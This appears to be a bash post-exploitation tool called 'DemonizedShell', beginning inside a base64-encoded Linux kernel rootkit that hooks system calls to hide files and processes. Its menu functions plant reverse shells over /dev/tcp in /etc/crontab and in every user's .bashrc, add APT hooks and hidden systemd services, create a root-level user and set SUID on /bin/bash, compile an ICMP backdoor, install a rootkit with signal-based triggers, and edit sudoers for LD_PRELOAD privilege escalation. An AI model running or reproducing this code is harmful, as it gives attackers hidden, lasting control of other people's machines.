KfQoKc3RhdGljIGFzbWxpbmthZ2UgaW50IGhvb2tfZ2V0ZGVudHModW5zaWduZWQgaW50IGZkLCBzdHJ1Y3QgbGludXhfZGlyZW50ICpkaXJlbnQsIHVuc2lnbmVkIGludCBjb3VudCkKewoJaW50IHJldCA9IG9yaWdfZ2V0ZGVudHMoZmQsIGRpcmVudCwgY291bnQpLCBlcnI7Cgl1bnNpZ25lZCBzaG9ydCBwcm9jID0gMDsKCXVuc2lnbmVkIGxvbmcgb2ZmID0gMDsKCXN0cnVjdCBsaW51eF9kaXJlbnQgKmRpciwgKmtkaXJlbnQsICpwcmV2ID0gTlVMTDsKCXN0cnVjdCBpbm9kZSAqZF9pbm9kZTsKCglpZiAocmV0IDw9IDApCgkJcmV0dXJuIHJldDsJCgoJa2RpcmVudCA9IGt6YWxsb2MocmV0LCBHRlBfS0VSTkVMKTsKCWlmIChrZGlyZW50ID09IE5VTEwpCgkJcmV0dXJuIHJldDsKCgllcnIgPSBjb3B5X2Zyb21fdXNlcihrZGlyZW50LCBkaXJlbnQsIHJldCk7CglpZiAoZXJyKQoJCWdvdG8gb3V0OwoKI2lmIExJTlVYX1ZFUlNJT05fQ09ERSA8IEtFUk5FTF9WRVJTSU9OKDMsIDE5LCAwKQoJZF9pbm9kZSA9IGN1cnJlbnQtPmZpbGVzLT5mZHQtPmZkW2ZkXS0+Zl9kZW50cnktPmRfaW5vZGU7CiNlbHNlCglkX2lub2RlID0gY3VycmVudC0+ZmlsZXMtPmZkdC0+ZmRbZmRdLT5mX3BhdGguZGVudHJ5LT5kX2lub2RlOwojZW5kaWYKCglpZiAoZF9pbm9kZS0+aV9pbm8gPT0gUFJPQ19ST09UX0lOTyAmJiAhTUFKT1IoZF9pbm9kZS0+aV9yZGV2KQoJCS8qJiYgTUlOT1IoZF9pbm9kZS0+aV9yZGV2KSA9PSAxKi8pCgkJcHJvYyA9IDE7CgoJd2hpbGUgKG9mZiA8IHJldCkgewoJCWRpciA9ICh2b2lkICopa2RpcmVudCArIG9mZjsKCQlpZiAoKCFwcm9jICYmIAoJCShtZW1jbXAoUFJFRklYLCBkaXItPmRfbmFtZSwgc3RybGVuKFBSRUZJWCkpID09IDApKQoJCXx8IChwcm9jICYmCgkJaXNfaW52aXNpYmxlKHNpbXBsZV9zdHJ0b3VsKGRpci0+ZF9uYW1lLCBOVUxMLCAxMCkpKSkgewoJCQlpZiAoZGlyID09IGtkaXJlbnQpIHsKCQkJCXJldCAtPSBkaXItPmRfcmVjbGVuOwoJCQkJbWVtbW92ZShkaXIsICh2b2lkICopZGlyICsgZGlyLT5kX3JlY2xlbiwgcmV0KTsKCQkJCWNvbnRpbnVlOwoJCQl9CgkJCXByZXYtPmRfcmVjbGVuICs9IGRpci0+ZF9yZWNsZW47CgkJfSBlbHNlCgkJCXByZXYgPSBkaXI7CgkJb2ZmICs9IGRpci0+ZF9yZWNsZW47Cgl9CgllcnIgPSBjb3B5X3RvX3VzZXIoZGlyZW50LCBrZGlyZW50LCByZXQpOwoJaWYgKGVycikKCQlnb3RvIG91dDsKb3V0OgoJa2ZyZWUoa2RpcmVudCk7CglyZXR1cm4gcmV0Owp9CiNlbmRpZgoKc3RhdGljIGludCBob29rKHZvaWQpIHsKCV9fc3lzX2NhbGxfdGFibGVbX19OUl9raWxsXSA9ICh1bnNpZ25lZCBsb25nKSZob29rX2tpbGw7CglfX3N5c19jYWxsX3RhYmxlW19fTlJfZ2V0ZGVudHNdID0gKHVuc2lnbmVkIGxvbmcpJmhvb2tfZ2V0ZGVudHM7CgkjaWZkZWYgX19OUl9nZXRkZW50czY0CglfX3N5c19jYWxsX3RhYmxlW19fTlJfZ2V0ZGVudHM2NF0gPSAodW5zaWduZWQgbG9uZykmaG9va19nZXRkZW50czY0OwoJI2VuZGlmCglyZXR1cm4oMCk7Cn0KCnN0YXRpYyBpbnQgc3RvcmUodm9pZCkgewoJI2lmZGVmIFBUUkVHU19TWVNDQUxMX1NUVUJTCgkJb3JpZ19raWxsID0gKHB0cmVnc190KV9fc3lzX2NhbGxfdGFibGVbX19OUl9raWxsXTsKCQlvcmlnX2dldGRlbnRzPShwdHJlZ3NfdClfX3N5c19jYWxsX3RhYmxlW19fTlJfZ2V0ZGVudHNdOwoJCSNpZmRlZiBfX05SX2dldGRlbnRzNjQKCQkJb3JpZ19nZXRkZW50czY0ID0gKHB0cmVnc190KV9fc3lzX2NhbGxfdGFibGVbX19OUl9nZXRkZW50czY0XTsKCQkjZW5kaWYKCSNlbHNlCgkJb3JpZ19raWxsID0gKG9yaWdfa2lsbF90KV9fc3lzX2NhbGxfdGFibGVbX19OUl9raWxsXTsKCQlvcmlnX2dldGRlbnRzPShvcmlnX2dldGRlbnRzX3QpX19zeXNfY2FsbF90YWJsZVtfX05SX2dldGRlbnRzXTsKCQkjaWZkZWYgX19OUl9nZXRkZW50czY0CgkJCW9yaWdfZ2V0ZGVudHM2NCA9IChvcmlnX2dldGRlbnRzNjRfdClfX3N5c19jYWxsX3RhYmxlW19fTlJfZ2V0ZGVudHM2NF07CgkJI2VuZGlmCgkjZW5kaWYKCXJldHVybigwKTsKfQoKCnN0YXRpYyBpbnQgY2xlYW51cCh2b2lkKSB7CglfX3N5c19jYWxsX3RhYmxlW19fTlJfa2lsbF0gPSAodW5zaWduZWQgbG9uZylvcmlnX2tpbGw7CglfX3N5c19jYWxsX3RhYmxlW19fTlJfZ2V0ZGVudHNdID0gKHVuc2lnbmVkIGxvbmcpb3JpZ19nZXRkZW50czsKCSNpZmRlZiBfX05SX2dldGRlbnRzNjQKCQlfX3N5c19jYWxsX3RhYmxlW19fTlJfZ2V0ZGVudHM2NF0gPSAodW5zaWduZWQgbG9uZylvcmlnX2dldGRlbnRzNjQ7CgkjZW5kaWYKCXJldHVybigxKTsKfQoKaW50IGluaXRfbW9kdWxlXyh2b2lkKSB7CglfX3N5c19jYWxsX3RhYmxlID0gKHVuc2lnbmVkIGxvbmcqKWdldF9zeXNjYWxsX3RhYmxlKCk7CglwcmludGsoS0VSTl9JTkZPICJyazogNjAsIDYxLCA2MihnciwgaHAsIHNwKVxuIik7CglpZighX19zeXNfY2FsbF90YWJsZSkgewoJCXJldHVybigtMSk7Cgl9CgloaWRlX215c2VsZigpOwoJc3RvcmUoKTsKCXVucHJvdGVjdF9tZW1vcnkoKTsKCWhvb2soKTsKCXByb3RlY3RfbWVtb3J5KCk7CgllbmFibGVfdHJhbnN3YXJwKCk7CglyZXR1cm4oMCk7Cn0KCnZvaWQgZXhpdF9tb2R1bGVfKHZvaWQpIHsKCWNsZWFudXAoKTsKfQoKTU9EVUxFX0xJQ0VOU0UoIkdQTCIpOwpNT0RVTEVfQVVUSE9SKCJUZXJyYW1pbmF0b3IiKTsKCm1vZHVsZV9pbml0KGluaXRfbW9kdWxlXyk7Cm1vZHVsZV9leGl0KGV4aXRfbW9kdWxlXyk7"

rainbow() {
    local text=$1
    echo "$text" #| lolcat -p 0.3 -a -d 1
}

requirements() {
    sudo apt-get install lolcat git make gcc -y
}

crontab() {
    rainbow " [*] Crontab Persistence [*] "
    echo -e "\n"
    rainbow "Want to insert a custom command into crontab?"
    rainbow "Enter 'yes' to enter a custom command or 'no' to run the default command."
    read resposta

    if [[ $resposta == "yes" ]]; then
      rainbow "Enter the command you want to add to the crontab: "
      read comando
    else
      rainbow "Enter the IP address: "
      read ip

      rainbow "Enter port: "
      read porta

      comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"
    fi

    rainbow "Adding command to crontab..."
    echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null
    rainbow "Command successfully added!"
}

bashRCPersistence() {
    rainbow " [*] .bashrc Persistence [*] "
    echo -e "\n"

      rainbow "Enter your listener's IP address: "
      read ip

      rainbow "Enter the port number of your listener: "
      read porta

      payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$porta 0>&1'"

      for usuario in /home/*; do
        if [ -d "$usuario" ]; then
          rainbow "Inserting the reverse shell payload in the .bashrc of $user..."
          rainbow "$payload" >> "$usuario/.bashrc"
          rainbow "Payload successfully inserted into $usuario/.bashrc"
        fi
      done
    rainbow ".bashrc persistence setup successfully!!"
}

userANDBashSUID() {
    rainbow " [*] Privileged User & SUID /bin/bash [*] "
    echo -e "\n"

    rainbow "Enter a name for the user: "
    read user

    adduser $user
    usermod -aG sudo $user
    chmod u+s /bin/bash

    rainbow "User $username created with root permissions and SUID set in /bin/bash"
}

apthooking() {
    rainbow " [ * ]  hooking the apt-get update command [ * ] "
    echo -e "\n"

    rainbow "Enter a payload or command, as soon as the user enters sudo apt-get update, this command that you enter below will be executed!"
    read command

    sudo touch /etc/apt/apt.conf.d/1aptget
    echo "APT::Update::Pre-Invoke {\"$command\";};" | sudo tee /etc/apt/apt.conf.d/1aptget > /dev/null

    rainbow "Your hook is in /etc/apt/apt.conf.d/1aptget with the command: $command"
}

systemdUser() {
    rainbow "[ * ] Systemd User level [ * ] "

    echo -e "\n"

      rainbow "Do you want to run a script? (Y/n): "
      read execute_script

    if [[ $execute_script == "Y" ]]; then
      rainbow "Enter the full path of the script: "
      read script_path
    else
      rainbow "Type the command to run in ExecStart: "
      read exec_command
    fi

    cat > ~/.config/systemd/user/hidden.service <<EOF
[Unit]
Description=My service

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
      rainbow "Error: The specified script does not have execute permission."
    else
      systemctl --user daemon-reload

      systemctl --user enable hidden.service
      systemctl --user start hidden.service
    fi

    rainbow "Systemd Persistence at user level setup successfully!!"
}
systemdRoot() {
    rainbow "[ * ] Systemd root level [ * ] "

    echo -e "\n"

    rainbow "Do you want to run a script? (Y/n): "
    read execute_script

    if [[ $execute_script == "Y" ]]; then
      rainbow "Enter the full path of the script: "
      read script_path
    else
      rainbow "Type the command to run in ExecStart: "
      read exec_command
    fi

    cat > /etc/systemd/system/hidden2.service <<EOF
[Unit]
Description=My service

[Service]
ExecStart=${script_path:-$exec_command}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

    if [[ $execute_script == "Y" && ! -x $script_path ]]; then
      rainbow "Error: The specified script does not have execute permission."
    else
      systemctl daemon-reload

      systemctl enable hidden2.service
      systemctl start hidden2.service

      rainbow "Systemd Root level setup successfully!"
    fi
}

sshGen() {
    while IFS=':' read -r username password uid gid full_name home shell; do
        if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]]; then
            rainbow "User $username has shell $shell"

            if [ ! -f "$home/.ssh/id_rsa.pub" ]; then
                rainbow "Generating ssh-key for user $username"

                sleep 5

                mkdir -p "$home/.ssh"

                ssh-keygen -t rsa -N "" -f "$home/.ssh/id_rsa"

                chmod 700 "$home/.ssh"
                chmod 600 "$home/.ssh/id_rsa"
                chown -R "$username:$username" "$home/.ssh"

                clear
            else
                rainbow "SSH key already exists for user $username"
            fi
        fi
    done < "/etc/passwd"

    sleep 3

    rainbow "SSH-KEY successfully generated for all valid users!!"
}

lkmRootkitmodified() {
  chmod +x implant_rootkit.sh
  ./implant_rootkit.sh
}

icmpBackdoor() {
  mkdir /tmp/tmpfolder
  echo $PINGOOR_MAIN_SRC | base64 -d > /tmp/tmpfolder/pingoor.c
  echo $PINGOOR_HEADER | base64 -d > /tmp/tmpfolder/pingoor.h
  rainbow "Enter the IP address that will receive the ping: "
  read LHOST
  rainbow "Enter the port number that will receive the connection: "
  read LPORT
  mv /tmp/tmpfolder/pingoor.h /tmp/tmpfolder/pingoor.h.bak
	sed -e "s/127.0.0.1/$LHOST/" -e "s/1234/$LPORT/" /tmp/tmpfolder/pingoor.h.bak > /tmp/tmpfolder/pingoor.h
	gcc -o pingoor /tmp/tmpfolder/pingoor.c -static 2> /dev/null
	rm -r /tmp/tmpfolder
  rainbow "Backdoor compiled. You can find it in the current directory under the binary name pingoor."
}

lkmRootkit(){
  echo "locutus rootkit by Terraminator (https://github.com/Terraminator)"
  echo "installing locutus..."
  sudo apt install build-essential linux-headers-$(uname -r) -y
  mkdir /tmp/borg_d3monized
  cd /tmp/borg_d3monized
  echo $LOCUTUS_MAKEFILE | base64 -d > /tmp/borg_d3monized/Makefile
  echo $LOCUTUS_BROG_TRANSWARP | base64 -d > /tmp/borg_d3monized/borg_transwarp.c
  echo $LOCUTUS_DEC | base64 -d > /tmp/borg_d3monized/dec.py
  echo $LOCUTUS_ENC | base64 -d > /tmp/borg_d3monized/enc.py
  echo $LOCUTUS_C | base64 -d > /tmp/borg_d3monized/locutus.c
  gcc /tmp/borg_d3monized/borg_transwarp.c -o /tmp/borg_d3monized/borg_transwarp
  make
  sudo mv /tmp/borg_d3monized/borg_transwarp /bin/ &&
  sudo mv /tmp/borg_d3monized/dec.py /bin/borg_dec &&
  sudo chmod +x /bin/borg_dec &&
  sudo mv /tmp/borg_d3monized/enc.py /bin/borg_enc &&
  sudo chmod +x /bin/borg_enc &&
  mv /tmp/borg_d3monized/locutus.ko /tmp/borg_d3monized/borg_locutus.ko &&
  cp /tmp/borg_d3monized/borg_locutus.ko /lib/modules/$(uname -r)/kernel/lib &&
  depmod -a &&
  echo "borg_locutus" >> /etc/modules &&
  sudo insmod /tmp/borg_d3monized/borg_locutus.ko &&
  dmesg -C &&
  echo -ne "locutus succesfully installed! \nget a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\ndecode all files on the target with kill -61 $RANDOM\nThe folder name is now borg_d3monized!\n"
}

SetupLdPreloadPrivesc(){
  echo "Defaults    env_keep += LD_PRELOAD" >> /etc/sudoers
  read -p "Enter with your user or www-data: " user
  echo "$user ALL=(ALL:ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
  scs="[*] Success! LD_PRELOAD for Privesc has been implanted. [*]"

  for i in $(seq 1 ${#scs}); do
          echo -ne "${scs:i-1:1}"
          sleep 0.05
  done
  echo -ne "\n"
  clear
}

banner() {
    rainbow "
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                    TM         (_.)  _  )   /
  |  | |\  | ~|~ \ /             \`.___/ \`    /
  |  | | \ |  |   X                \`-----' /
  \`__| |  \| _|_ / \\  <----.     __ / __   \\
      version 1.2     <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\

  DemonizedShell is a Tool to gain persistence on linux systems"
    printf "\n\n"
}

menu() {
    cat << EOF 
  [01] Generate SSH keypair       [06] Bashrc Persistence      
  [02] APT Persistence            [07] Privileged user & SUID bash
  [03] Crontab Persistence        [08] LKM Rootkit Modified, Bypassing rkhunter & chkrootkit
  [04] Systemd User level         [09] ICMP Backdoor
  [05] Systemd Root Level         [10] LKM Rootkit
                                  [11] Setup privesc LD_PRELOAD

    [*] Coming soon others features [*]

EOF

    printf "[D3m0niz3d]~# "

    read MENUINPUT

    if [ "$MENUINPUT" == "1" ] || [ "$MENUINPUT" == "01" ]; then
        sshGen
    elif [ "$MENUINPUT" == "2" ] || [ "$MENUINPUT" == "02" ]; then
        apthooking
    elif [ "$MENUINPUT" == "3" ] || [ "$MENUINPUT" == "03" ]; then
        crontab
    elif [ "$MENUINPUT" == "4" ] || [ "$MENUINPUT" == "04" ]; then
        systemdUser
    elif [ "$MENUINPUT" == "5" ] || [ "$MENUINPUT" == "05" ]; then
        systemdRoot
    elif [ "$MENUINPUT" == "6" ] || [ "$MENUINPUT" == "06" ]; then
        bashRCPersistence
    elif [ "$MENUINPUT" == "7" ] || [ "$MENUINPUT" == "07" ]; then
        userANDBashSUID
    elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
        lkmRootkitmodified
    elif [ "$MENUINPUT" == "9" ] || [ "$MENUINPUT" == "09" ]; then
        icmpBackdoor
    elif [ "$MENUINPUT" == "10" ] || [ "$MENUINPUT" == "10" ]; then
        lkmRootkit
    elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "11" ]; then
        SetupLdPreloadPrivesc
    else 
        echo "This option does not exist"
    fi
}

main() {
    if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
    fi

    requirements
    clear
    banner
    sleep 0.5

    menu
}

main
